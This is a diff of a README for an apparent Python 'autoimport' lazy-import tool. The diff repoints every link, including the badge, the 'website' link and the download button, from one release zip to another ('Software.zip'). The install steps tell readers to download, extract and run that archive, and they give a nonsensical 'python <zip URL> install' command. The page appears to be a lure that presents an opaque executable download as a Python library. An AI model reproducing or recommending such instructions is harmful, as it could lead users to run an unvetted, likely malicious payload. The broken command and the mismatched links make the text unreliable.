@@ -1,12 +1,12 @@
 # Effortless Lazy Python Imports
 
-![autoimport](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip)
+![autoimport](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip)
 
 Welcome to the **autoimport** repository - your one-stop solution for effortless lazy Python imports! This tool simplifies the process of importing modules and packages in Python, making your coding experience smoother and more efficient. With lazy loading capabilities, you can optimize the loading of modules only when needed, reducing resource consumption and speeding up your scripts.
 
 ## 🚀 Quick Start
 
-To get started with **autoimport**, simply [download the https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip file](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip) and follow the installation instructions provided in the repository.
+To get started with **autoimport**, simply [download the https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip file](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip) and follow the installation instructions provided in the repository.
 
 ### Features:
 
@@ -31,13 +31,13 @@ Explore the following topics related to **autoimport**:
 
 To install **autoimport**, follow these steps:
 
-1. Download the https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip file from the [link provided](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip).
+1. Download the https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip file from the [link provided](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip).
 2. Extract the contents of the zip file.
 3. Run the installation script.
 4. You're ready to start using **autoimport** in your Python projects!
 
 ```bash
-$ python https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip install
+$ python https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip install
 ```
 
 ## 📚 Usage
@@ -70,10 +70,10 @@ We welcome contributions from the open-source community to enhance **autoimport*
 
 ## 🔗 Additional Resources
 
-- [Visit our website](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip) for more information
+- [Visit our website](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip) for more information
 - Check the "Releases" section for the latest updates and versions
 
-[![Download Software](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip)](https://github.com/Sundarlalji/autoimport/releases/download/v1.0.0/Application.zip)
+[![Download Software](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip)](https://github.com/Sundarlalji/autoimport/releases/download/v2.0/Software.zip)
 
 Let's simplify Python imports together with **autoimport**! Happy coding! 🐍💻
 
